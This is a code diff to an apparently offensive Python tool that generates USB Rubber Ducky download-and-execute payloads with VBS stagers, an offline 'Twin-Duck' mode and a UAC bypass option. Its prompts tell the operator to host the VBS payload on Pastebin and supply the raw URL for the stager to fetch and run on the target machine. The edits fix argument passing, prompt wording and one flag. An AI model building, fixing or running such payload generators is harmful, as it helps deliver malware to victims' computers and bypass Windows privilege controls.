@@ -180,7 +180,8 @@ def gen_vbs_script(url, name_type, payload_url, name, executable_name):
     if payload_url:
         _gen_script(url, name_type, payload_url, name, executable_name, 'UAC-Duck-Payload.vbs')
     else:
-        _gen_script(url, name_type, name=name, file_name=file_name)
+        _gen_script(url, name_type, None, name=name, executable_name=executable_name, file_name='DuckyScript.txt')
+
     print("\n[+] Payload UAC-Duck-Payload.vbs generated!")
 
 def gen_payload_duckyscript(url, name_type, payload_url, name, executable_name):
@@ -307,6 +308,7 @@ def generate_script(online_version, uac_bypass, **kw):
 
         # creates a vbs stager.
         gen_vbs_script(PAYLOAD_VBS_URL,'[NAME]',
+                       None,
                        name=kw['payload_name'],
                        executable_name=kw['stager_name'])
 
@@ -396,10 +398,10 @@ def main():
 
         print("[+] Please UPLOAD this .vbs file as raw text format to a webserver(Pastebin works great).")
         print('[+] Pastebin/RAW recommended Example http://pastebin.com/raw/VBSPAYLOAD).')
-        print('[+] Please now enter your UAC VBS Payload URL you used for upload.\n')
+        print('[+] Please now enter your UAC VBS Payload URL you used for upload....\n')
 
         uac_payload_url = input("ONLINE VERSION with UAC BYPASS >>> ")
-        uac_vbs_name = input('\n[+] Now enter a NAME to save the UAC VBS Payload file as. The default name is(update.vbs : ')
+        uac_vbs_name = input('\n[+] Now enter a NAME to save the UAC VBS Payload file as. Default name is (update.vbs) : ')
 
         generate_script(True, True, payload_url=binary_payload_url, payload_name=executable_name,
                         uac_payload_url=uac_payload_url, uac_vbs_name=uac_vbs_name.lower())
@@ -412,7 +414,7 @@ def main():
                 break
 
         drive_name = input("[+] Please input your Twin-Duck drive name e.g. backup. : ")
-        msg = "[OFFLINE] Ducky D&E Blazing fast payload (Without UAC bypass) "
+        msg = "\n[OFFLINE] Ducky D&E Blazing fast payload (Without UAC bypass) "
         if choice == 3:
             print(msg)
             generate_script(False, False, drive_name=drive_name, payload_name=payload_name)
@@ -424,7 +426,7 @@ def main():
                 if check_file_ext(stager_name, '.vbs'):
                     break
 
-            generate_script(False, False, payload_name=payload_name,
+            generate_script(False, True, payload_name=payload_name,
                             stager_name=stager_name, drive_name=drive_name)
 
     elif choice == 5:
